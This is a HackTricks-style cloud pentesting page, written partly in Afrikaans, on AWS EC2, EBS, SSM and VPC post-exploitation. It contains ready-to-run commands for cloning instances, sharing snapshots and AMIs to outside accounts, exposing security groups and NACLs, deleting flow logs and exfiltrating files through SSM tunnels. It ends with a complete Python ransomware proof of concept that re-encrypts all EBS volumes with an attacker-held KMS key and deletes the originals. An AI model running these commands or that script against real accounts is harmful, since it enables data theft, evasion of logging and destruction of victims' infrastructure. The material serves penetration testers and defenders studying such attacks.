# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Vir meer inligting sien:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **dupliceer inkomende en uitgaande verkeer vir EC2 instances binne 'n VPC** sonder die behoefte om enigiets op die instances self te installeer. Hierdie gedupliseerde verkeer word gewoonlik na iets soos 'n network intrusion detection system (IDS) gestuur vir ontleding en monitering. 'n attacker kan dit misbruik om al die verkeer vas te vang en sensitiewe inligting daaruit te verkry:

Vir meer inligting, sien hierdie bladsy:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances bevat gewoonlik 'n soort sensitiewe inligting. Daar is verskillende maniere om binne te kom (kyk na [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). 'n Ander manier om te sien wat dit bevat is om **skep 'n AMI en start 'n nuwe instance (selfs in jou eie rekening) daarvandaan**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, wat gewoonlik **sensitive information** sal bevat, daarom behoort die nagaan daarvan hierdie inligting te openbaar.\
As jy 'n **volume without a snapshot** vind, kan jy: **Create a snapshot** en die volgende aksies uitvoer of dit net **mount it in an instance** binne die account:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Export an EC2 AMI straight to S3 using `CreateStoreImageTask` to obtain a raw disk image without snapshot sharing. Dit maak volle offline forensics of data theft moontlik terwyl die instance networking onaangeroer bly.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Attach an io1/io2 Multi-Attach volume to a second instance and mount it read-only to siphon live data without snapshots. Nuttig wanneer die victim volume reeds Multi-Attach binne dieselfde AZ geaktiveer het.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Create an EC2 Instance Connect Endpoint, authorize ingress, and inject ephemeral SSH keys to access private instances over a managed tunnel. Verleen vinnige lateral movement paaie sonder om publieke poorte oop te maak.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Move a victim ENI’s secondary private IP to an attacker-controlled ENI to impersonate trusted hosts that are allowlisted by IP. Dit maak dit moontlik om interne ACLs of SG rules wat aan spesifieke adresse gekoppel is, te omseil.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Reassociate an Elastic IP from the victim instance to the attacker to intercept inbound traffic or originate outbound connections that appear to come from trusted public IPs.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

If a security group rule references a customer-managed prefix list, adding attacker CIDRs to the list silently expands access across every dependent SG rule without modifying the SG itself.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Create gateway or interface VPC endpoints to regain outbound access from isolated subnets. Leveraging AWS-managed private links bypasses missing IGW/NAT controls for data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

An attacker with the ec2:AuthorizeSecurityGroupIngress permission can add inbound rules to security groups (for example, allowing tcp:80 from 0.0.0.0/0), thereby exposing internal services to the public Internet or to otherwise unauthorized networks.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
’ n Aanvaller met ec2:ReplaceNetworkAclEntry (of soortgelyke) permissies kan die subnet se Network ACLs (NACLs) wysig om dit baie permissief te maak — byvoorbeeld deur 0.0.0.0/0 op kritieke poorte toe te laat — en sodoende die hele subnet-reeks aan die Internet of aan onbevoegde netwerksegmente bloot te stel. Anders as Security Groups, wat per-instance toegepas word, word NACLs op subnet level toegepas, so om ’n beperkende NACL te verander kan ’n baie groter blast radius hê deur toegang tot baie meer hosts moontlik te maak.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

'n aanvaller met ec2:Delete* en iam:Remove* regte kan kritieke infrastruktuurhulpbronne en konfigurasies uitvee — byvoorbeeld key pairs, launch templates/versions, AMIs/snapshots, volumes of attachments, security groups of rules, ENIs/network endpoints, route tables, gateways, of managed endpoints. Dit kan onmiddellike diensonderbreking, dataverlies, en verlies van forensiese bewyse tot gevolg hê.

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Wys VPC Flow Logs na 'n attacker-controlled S3 bucket om netwerkmetadata (source/destination, ports) buite die victim account deurlopend in te samel vir long-term reconnaissance.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Selfs as jy 'n EC2 toemaak sodat geen verkeer kan uitgaan nie, kan dit steeds **exfil via DNS**.

- **VPC Flow Logs sal dit nie opneem nie**.
- Jy het geen toegang tot AWS DNS logs nie.
- Deaktiveer dit deur "enableDnsSupport" op false te stel met:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

'n aanvaller kan API endpoints van 'n account wat hy beheer, aanroep. Cloudtrail sal hierdie calls log en die aanvaller sal die exfiltrate data in die Cloudtrail logs kan sien.

### Open Security Group

Jy kan verdere toegang tot netwerkdienste kry deur poorte so te open:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Dit is moontlik om 'n EC2-instance te laat loop en dit te registreer sodat dit gebruik kan word om ECS-instances te laat loop en dan die ECS-instances se data te steel.

Vir [**meer inligting sien hier**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Verwyder VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Benodigde toestemmings:

- `ssm:StartSession`

Benewens opdraguitvoering, laat SSM traffic tunneling toe, wat misbruik kan word om te pivot vanaf EC2-instanse wat geen netwerktoegang het nie weens Security Groups of NACLs.
Een van die scenario's waarin dit nuttig is, is om te pivot vanaf 'n [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) na 'n private EKS cluster.

> Om 'n sessie te begin benodig jy die SessionManagerPlugin geïnstalleer: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Installeer die SessionManagerPlugin op jou masjien
2. Meld aan by die Bastion EC2 met die volgende opdrag:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Kry die Bastion EC2 AWS tydelike inlogbewyse met die [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) skrip
4. Dra die inlogbewyse oor na jou eie masjien in die `$HOME/.aws/credentials`-lêer as die `[bastion-ec2]` profiel
5. Meld aan by EKS as die Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Werk die `server`-veld in die `$HOME/.kube/config`-lêer by om na `https://localhost` te wys
7. Skep 'n SSM tunnel soos volg:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Die verkeer van die `kubectl`-hulpmiddel word nou deur die SSM-tonnel via die Bastion EC2 gestuur, en jy kan die private EKS-kluster vanaf jou eie masjien bereik deur die volgende uit te voer:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Let wel dat die SSL-verbindinge sal misluk tensy jy die `--insecure-skip-tls-verify` vlag stel (of sy ekwivalent in K8s-auditgereedskap). Aangesien die verkeer deur die veilige AWS SSM-tonnel gelei word, is jy veilig teen enige vorm van MitM-aanvalle.

Laastens, hierdie tegniek is nie spesifiek vir die aanval van privaat EKS-klusters nie. Jy kan arbitrêre domeine en poorte instel om na enige ander AWS-diens of 'n pasgemaakte toepassing te pivot.

---

#### Vinnige Plaaslike ↔️ Afgeleë Port Forward (AWS-StartPortForwardingSession)

As jy slegs een TCP-poort van die EC2-instansie na jou plaaslike gasheer hoef deur te stuur, kan jy die `AWS-StartPortForwardingSession` SSM-dokument gebruik (geen remote host-parameter benodig):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Die opdrag stel 'n bidirectionele tonnel tussen jou werkstasie (`localPortNumber`) en die geselekteerde poort (`portNumber`) op die instansie **sonder om enige inkomende Security-Group rules oop te maak**.

Algemene gebruiksgevalle:

* **File exfiltration**
1. Op die instansie begin 'n vinnige HTTP server wat na die gids wys wat jy wil exfiltrate:

```bash
python3 -m http.server 8000
```

2. Vanaf jou werkstasie haal die lêers deur die SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Toegang tot interne webtoepassings (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Wenk: Komprimeer en enkripteer bewyse voordat jy dit exfiltrating sodat CloudTrail nie die clear-text inhoud log nie:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Deel AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Soek sensitiewe inligting in openbare en privaat AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel is 'n hulpmiddel ontwerp om **sensitiewe inligting binne openbare of privaat Amazon Machine Images (AMIs) te soek**. Dit outomatiseer die proses om instances vanaf geteikende AMIs te launch, hul volumes te mount, en te scan vir potensiële secrets of sensitiewe data.

### Deel EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

'n Proof of concept soortgelyk aan die Ransomware-demonstrasie in die S3 post-exploitation notes. KMS behoort hernoem te word na RMS vir Ransomware Management Service aangesien dit so maklik is om te gebruik om verskeie AWS-dienste daarmee te enkripteer.

Eerstens, vanaf 'attacker' AWS account, skep 'n customer managed key in KMS. Vir hierdie voorbeeld sal ons net AWS die key data laat bestuur, maar in 'n realistiese scenario sou 'n malicious actor die key data buite AWS' control hou. Verander die key policy om enige AWS account Principal toe te laat om die key te gebruik. Vir hierdie key policy was die rekening se naam 'AttackSim' en die policy rule wat alle toegang toelaat word 'Outside Encryption' genoem.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Die sleutelbeleidreël benodig die volgende geaktiveer om die vermoë te hê om dit te gebruik om 'n EBS-volume te enkripteer:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Nou met die publiek toeganklike sleutel om te gebruik. Ons kan 'n 'victim' rekening gebruik wat 'n paar EC2-instances het wat opgestel is met onversleutelde EBS-volumes aangeheg. Die EBS-volumes van hierdie 'victim' rekening is wat ons teiken vir enkripsie; hierdie aanval vind plaas onder die veronderstelde inbreuk van 'n hoë-privilegie AWS-rekening.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Soortgelyk aan die S3 ransomware example. Hierdie aanval sal kopieë van die aangehegte EBS-volumes skep deur gebruik te maak van snapshots, die publiek beskikbare sleutel van die 'attacker' rekening gebruik om die nuwe EBS-volumes te enkripteer, dan die oorspronklike EBS-volumes van die EC2-instances loskoppel en uitvee, en uiteindelik die snapshots verwyder wat gebruik is om die nuut-gekodeerde EBS-volumes te skep. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Dit lei daartoe dat slegs geënkripteerde EBS-volumes in die rekening beskikbaar oorbly.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Ook noemenswaardig: die skrip het die EC2-instances stopgesit om die oorspronklike EBS-volumes los te koppel en uit te vee. Die oorspronklike onversleutelde volumes is nou weg.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Volgende, keer terug na die sleutelbeleid in die 'attacker' rekening en verwyder die 'Outside Encryption' beleidsreël uit die sleutelbeleid.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Wag 'n oomblik totdat die nuut ingestelde sleutelbeleid versprei. Keer dan terug na die 'victim' rekening en probeer om een van die pas-versleutelde EBS-volumes aan te heg. Jy sal vind dat jy die volume kan aanheg.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Maar wanneer jy probeer om die EC2-instance werklik weer op te start met die versleutelde EBS-volume, sal dit net misluk en van die 'pending' toestand teruggaan na die 'stopped' toestand vir ewig, omdat die aangehegte EBS-volume nie met die sleutel gedekripteer kan word nie aangesien die sleutelbeleid dit nie meer toelaat.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Dit is die python-skrip wat gebruik is. Dit neem AWS creds vir 'n 'victim' rekening en 'n publiek beskikbare AWS ARN-waarde vir die sleutel wat vir enkripsie gebruik gaan word. Die skrip sal versleutelde kopieë maak van ALLE beskikbare EBS-volumes wat aan ALLE EC2-instances in die geteikende AWS-rekening aangeheg is, dan elke EC2-instance stop, die oorspronklike EBS-volumes loskoppel, dit verwyder, en uiteindelik al die snapshots wat tydens die proses gebruik is, verwyder. Dit sal slegs versleutelde EBS-volumes in die geteikende 'victim' rekening oorlaat. GEBRUIK HIERDIE SKRIP SLEGS IN 'N TEST-OMGEWING, DIT IS DESTRUKTIEF EN SAL AL DIE OORSPRONKLIKE EBS-VOLUMES VERWYDER. Jy kan dit herstel deur die gebruikte KMS-sleutel te gebruik en dit via snapshots na hul oorspronklike toestand te herstel, maar ek wil net hê jy moet bewus wees dat dit uiteindelik 'n ransomware PoC is.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Verwysings

- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
